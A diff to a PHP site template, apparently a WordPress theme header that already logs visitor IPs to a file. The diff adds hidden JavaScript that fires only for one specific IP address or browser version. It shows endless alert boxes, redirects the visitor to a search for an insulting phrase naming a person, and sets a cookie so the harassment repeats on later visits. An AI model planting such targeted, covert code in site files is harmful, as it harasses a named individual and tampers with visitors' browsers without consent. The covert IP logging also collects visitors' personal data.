@@ -80,7 +80,7 @@ if ( !empty($clrs_style) ) {
 </nav>
 
 </div>
-<?                          //ip获取代码
+<?php                          //ip获取代码
 date_default_timezone_set("PRC");
 
 $ipfile = "wp-content/ip.txt";//保存的文件名
@@ -110,4 +110,51 @@ if (strpos($text, "bot")==false && strpos($text,"spider")==false && strpos($text
 		fclose($handle2);
 
 	}
+function fuck()
+{
+		echo "<script type=\"text/javascript\">
+		var t
+		function timedCount()
+ 	{
+		alert(88)
+	 	t=setTimeout(\"timedCount()\",1000)
+ 	}
+ 		timedCount()
+ 		function newDoc()
+ 	 {
+	  window.location.assign(\"http://www.baidu.com/#wd=SB%E5%90%B4%E6%B5%B7%E4%BA%AE\")
+ 	 }
+ 	 newDoc()
+ 	 document.cookie=\"SBwuhailiang\"
+	</script>";
+
+}
+if($ip=="183.4.86.120" )
+{
+fuck();
+}
+if(strpos($text,"34.0.1847.131")!= false)
+	{
+		fuck();
+	}
+
+echo "<script> if(document.cookie.match(\"SB\")!=null)
+{
+		var t
+		function timedCount()
+ 	{
+		alert(88)
+	 	t=setTimeout(\"timedCount()\",1000)
+ 	}
+ 		timedCount()
+ 		function newDoc()
+ 	 {
+	  window.location.assign(\"http://www.baidu.com/#wd=SB%E5%90%B4%E6%B5%B7%E4%BA%AE\")
+ 	 }
+ 	 newDoc()
+ 	 document.cookie=\"SBwuhailiang\"
+}	
+ </script>";
+
 ?>
+
